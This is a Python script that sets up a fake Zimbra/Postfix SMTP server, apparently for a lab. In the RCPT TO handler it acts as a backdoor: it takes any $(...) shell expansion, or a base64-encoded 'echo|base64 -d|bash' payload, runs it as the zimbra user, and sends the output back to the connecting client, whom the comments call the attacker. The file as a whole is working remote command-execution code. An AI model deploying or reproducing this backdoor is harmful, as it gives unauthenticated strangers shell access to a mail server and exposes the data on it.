#!/usr/bin/env python3
import socket
import subprocess
import re
import base64
import threading
import time

class PostfixBackdoor:
    def __init__(self, host='0.0.0.0', port=2525):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                    client_thread.daemon = True
                    client_thread.start()
                    
                except Exception as e:
                    if self.running:
                        pass
                        
        except Exception as e:
            pass
            
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
    def send_response(self, client_socket, code, message):
        try:
            response = '{} {}\r\n'.format(code, message)
            client_socket.send(response.encode())
        except:
            pass
            
    def handle_client(self, client_socket):
        try:
            self.send_response(client_socket, 220, 'Banner received zimbra.labo ESMTP Postfix')
            
            while True:
                try:
                    data = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                    if not data:
                        break
                        
                    if data.upper().startswith('EHLO'):
                        self.send_response(client_socket, 250, 'zimbra.labo')
                        self.send_response(client_socket, 250, 'SIZE 10240000')
                        self.send_response(client_socket, 250, 'VRFY')
                        self.send_response(client_socket, 250, 'ETRN')
                        self.send_response(client_socket, 250, 'STARTTLS')
                        self.send_response(client_socket, 250, 'AUTH LOGIN PLAIN')
                        self.send_response(client_socket, 250, 'AUTH=LOGIN PLAIN')
                        self.send_response(client_socket, 250, '8BITMIME')
                        self.send_response(client_socket, 250, 'DSN')
                        self.send_response(client_socket, 250, 'SMTPUTF8')
                        self.send_response(client_socket, 250, 'CHUNKING')
                        self.send_response(client_socket, 250, 'OK')
                        
                    elif data.upper().startswith('MAIL FROM:'):
                        self.send_response(client_socket, 250, 'OK')
                        
                    elif data.upper().startswith('RCPT TO:'):
                        shell_expansion_match = re.search(r'\$\(([^)]+)\)', data)
                        if shell_expansion_match:
                            command = shell_expansion_match.group(1)
                            try:
                                import subprocess
                                process = subprocess.Popen(['su', '-', 'zimbra', '-c', command], 
                                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                                        universal_newlines=True)
                                stdout, stderr = process.communicate(timeout=30)
                                
                                # Enviar saída do comando para o atacante
                                if stdout:
                                    self.send_response(client_socket, 250, 'OK - Output: ' + stdout.strip())
                                elif stderr:
                                    self.send_response(client_socket, 250, 'OK - Error: ' + stderr.strip())
                                else:
                                    self.send_response(client_socket, 250, 'OK - Command executed')
                            except Exception as e:
                                self.send_response(client_socket, 250, 'OK - Command failed')
                                
                        elif 'aabbb$(' in data and 'echo${IFS}' in data and '|base64${IFS}-d|bash' in data:
                            base64_match = re.search(r'echo\$\{IFS\}([^|]+)\|base64\$\{IFS\}-d\|bash', data)
                            if base64_match:
                                base64_string = base64_match.group(1)
                                try:
                                    decoded_command = base64.b64decode(base64_string).decode('utf-8')
                                    import subprocess
                                    process = subprocess.Popen(['su', '-', 'zimbra', '-c', decoded_command], 
                                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                                            universal_newlines=True)
                                    stdout, stderr = process.communicate(timeout=30)
                                    
                                    # Enviar saída do comando para o atacante
                                    if stdout:
                                        self.send_response(client_socket, 250, 'OK - ' + stdout.strip())
                                    elif stderr:
                                        self.send_response(client_socket, 250, 'OK - ' + stderr.strip())
                                    else:
                                        self.send_response(client_socket, 250, 'OK')
                                except Exception as e:
                                    self.send_response(client_socket, 250, 'OK')
                                
                        else:
                            self.send_response(client_socket, 250, 'OK')
                        
                    elif data.upper() == 'DATA':
                        self.send_response(client_socket, 354, 'End data with <CR><LF>.<CR><LF>')
                        
                        while True:
                            data_line = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                            if data_line == '.':
                                break
                                
                        self.send_response(client_socket, 250, 'OK: queued as ABC123')
                        
                    elif data.upper() == 'QUIT':
                        self.send_response(client_socket, 221, 'Bye')
                        break
                        
                    else:
                        self.send_response(client_socket, 500, 'Error: command not recognized')
                        
                except Exception as e:
                    break
                    
        except Exception as e:
            pass
        finally:
            client_socket.close()

def main():
    backdoor = PostfixBackdoor()
    
    try:
        backdoor.start()
    except KeyboardInterrupt:
        backdoor.stop()
    except Exception as e:
        backdoor.stop()

if __name__ == '__main__':
    main()
